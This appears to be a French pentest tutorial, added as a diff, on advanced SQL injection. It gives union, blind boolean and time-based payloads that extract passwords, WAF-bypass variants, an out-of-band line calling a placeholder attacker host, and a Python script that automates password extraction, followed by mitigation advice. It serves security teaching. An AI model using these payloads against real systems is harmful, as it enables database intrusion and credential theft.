@@ -1,0 +1,164 @@
+---
+title: "Techniques avancées d'injection SQL"
+description: "Exploration des techniques d'injection SQL modernes, du blind SQLi aux injections basées sur le temps"
+date: 2025-01-10
+author: Franck Chevalier
+tags:
+  - pentest
+  - web
+  - vulnerability
+  - tutorial
+excerpt: Guide approfondi des techniques d'exploitation SQL avancées pour les pentests
+---
+
+## Introduction
+
+L'injection SQL reste l'une des vulnérabilités les plus critiques en 2025. Cet article explore les techniques avancées d'exploitation, au-delà des bases classiques.
+
+## Préparation
+
+Avant de commencer, assurez-vous d'avoir :
+
+- Un environnement de test légal (lab personnel, plateforme autorisée)
+- Des connaissances solides en SQL
+- Des outils comme SQLMap, Burp Suite, ou des scripts Python custom
+
+## 1. Union-Based SQL Injection
+
+La technique la plus directe, mais souvent bloquée par des WAF modernes.
+
+```sql
+' UNION SELECT NULL, username, password FROM users--
+```
+
+### Détection du nombre de colonnes
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+Continuez jusqu'à obtenir une erreur pour déterminer le nombre exact de colonnes.
+
+## 2. Blind SQL Injection
+
+Quand l'application ne retourne pas directement les données, on utilise des conditions booléennes.
+
+### Boolean-Based Blind SQLi
+
+```sql
+' AND 1=1--  # Page normale
+' AND 1=2--  # Page différente
+```
+
+Extraction des données caractère par caractère :
+
+```sql
+' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--
+```
+
+### Time-Based Blind SQLi
+
+Utilisation de délais pour extraire l'information :
+
+```sql
+' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0)--
+```
+
+## 3. Out-of-Band SQL Injection
+
+Exploitation via des canaux externes (DNS, HTTP).
+
+```sql
+'; EXEC xp_dirtree '\\attacker.com\share'--
+```
+
+## 4. Bypass de WAF
+
+### Encodage et obfuscation
+
+```sql
+' UNION/*!50000SELECT*/ NULL,username,password FROM users--
+```
+
+### Variations de casse
+
+```sql
+' UnIoN SeLeCt NULL,username,password FROM users--
+```
+
+### Utilisation de commentaires
+
+```sql
+'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--
+```
+
+## 5. Second Order SQL Injection
+
+L'injection est stockée puis exécutée dans un autre contexte.
+
+```python
+# Inscription avec payload
+username = "admin'--"
+# Exploitation lors de l'utilisation du nom d'utilisateur
+```
+
+## Automatisation avec Python
+
+Voici un script simple pour automatiser l'exploitation boolean-based :
+
+```python
+import requests
+
+def extract_data(url, injection_point):
+    data = ""
+    for i in range(1, 100):
+        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
+            payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1), {i}, 1) = '{char}'--"
+            response = requests.get(url + payload)
+            if "Welcome" in response.text:
+                data += char
+                print(f"Found: {data}")
+                break
+        else:
+            break
+    return data
+```
+
+## Protection et mitigation
+
+### Prepared Statements
+
+```python
+# Vulnérable
+query = f"SELECT * FROM users WHERE username = '{username}'"
+
+# Sécurisé
+cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
+```
+
+### ORM et frameworks modernes
+
+Les frameworks modernes (Django, SQLAlchemy) offrent une protection native.
+
+```python
+# Django ORM - Sécurisé par défaut
+User.objects.filter(username=username)
+```
+
+## Conclusion
+
+Les injections SQL évoluent avec les technologies de défense. Un pentester doit constamment adapter ses techniques et comprendre en profondeur les mécanismes de protection.
+
+> "La meilleure défense est une compréhension approfondie de l'attaque."
+
+## Ressources
+
+- OWASP SQL Injection Guide
+- PortSwigger Web Security Academy
+- SQLMap Documentation
+
+---
+
+**Disclaimer** : Ces techniques sont présentées à des fins éducatives uniquement. Ne testez que sur des systèmes dont vous avez l'autorisation explicite.
